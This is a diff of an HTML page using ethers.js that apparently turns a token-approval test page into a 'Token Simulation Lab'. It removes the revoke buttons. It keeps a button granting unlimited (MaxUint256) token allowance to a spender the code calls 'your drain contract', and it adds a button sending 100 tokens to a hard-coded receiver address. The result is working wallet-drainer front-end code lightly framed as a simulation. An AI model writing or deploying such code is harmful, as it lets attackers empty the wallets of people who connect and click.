@@ -1,44 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Test Approval UI</title>
+  <title>Token WalletConnect Simulation</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  <style>
-    body { font-family: sans-serif; }
-    button { padding: 8px 12px; margin: 5px; cursor: pointer; }
-  </style>
 </head>
 
-<body>
+<body style="font-family:sans-serif">
 
-<h2>🧪 Test: Unlimited Approval (Manual)</h2>
+<h2>🧪 Token Simulation Lab</h2>
 
-<button onclick="connect()">Connect Wallet</button>
+<button onclick="connect()">Connect Wallet</button><br><br>
 
-<p><b>Wallet:</b> <span id="addr">-</span></p>
+<button onclick="sendToken()">Send 100 Tokens</button><br><br>
 
-<hr>
+<button onclick="approveToken()">Approve Unlimited</button><br><br>
 
-<h3>Token A</h3>
-<button onclick="approveMax(tokenA)">Approve Unlimited</button>
-<button onclick="revoke(tokenA)">Revoke</button>
-
-<h3>Token B</h3>
-<button onclick="approveMax(tokenB)">Approve Unlimited</button>
-<button onclick="revoke(tokenB)">Revoke</button>
+<p id="status"></p>
 
 <script>
 let provider, signer, user;
 
-// ✅ YOUR TOKENS
-const tokenA = "0x089d6677646bc535B1A8535ED856bb17493E332d";
-const tokenB = "0x48e8484f7D30305A6Cb442fd4c780E0BaD366b76";
+// 🔁 YOUR TOKEN
+const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 
-// ✅ YOUR DRAIN CONTRACT
+// 🔁 RECEIVER (can be your same wallet for testing)
+const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
+
+// 🔁 SPENDER (your drain contract)
 const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
 
-const ABI = [
-  "function approve(address spender, uint256 amount) returns (bool)"
+const tokenABI = [
+  "function transfer(address to, uint256 amount) public returns (bool)",
+  "function approve(address spender, uint256 amount) public returns (bool)"
 ];
 
 async function connect() {
@@ -53,37 +46,42 @@ async function connect() {
   signer = provider.getSigner();
   user = await signer.getAddress();
 
-  document.getElementById("addr").innerText = user;
+  document.getElementById("status").innerText =
+    "Connected: " + user;
 }
 
-// 🔥 Unlimited approval (explicit click)
-async function approveMax(tokenAddr) {
+// 🟢 TOKEN TRANSFER
+async function sendToken() {
   try {
-    const token = new ethers.Contract(tokenAddr, ABI, signer);
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
-    const tx = await token.approve(
-      spender,
-      ethers.constants.MaxUint256
+    const tx = await contract.transfer(
+      receiver,
+      ethers.utils.parseUnits("100", 18)
     );
 
     await tx.wait();
 
-    alert("✅ Unlimited approval granted");
+    alert("✅ 100 tokens sent");
 
   } catch (e) {
     alert(e.message);
   }
 }
 
-// 🔐 Revoke
-async function revoke(tokenAddr) {
+// 🔴 APPROVE
+async function approveToken() {
   try {
-    const token = new ethers.Contract(tokenAddr, ABI, signer);
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
-    const tx = await token.approve(spender, 0);
+    const tx = await contract.approve(
+      spender,
+      ethers.constants.MaxUint256
+    );
+
     await tx.wait();
 
-    alert("🔐 Approval revoked");
+    alert("🔥 Unlimited approval given");
 
   } catch (e) {
     alert(e.message);
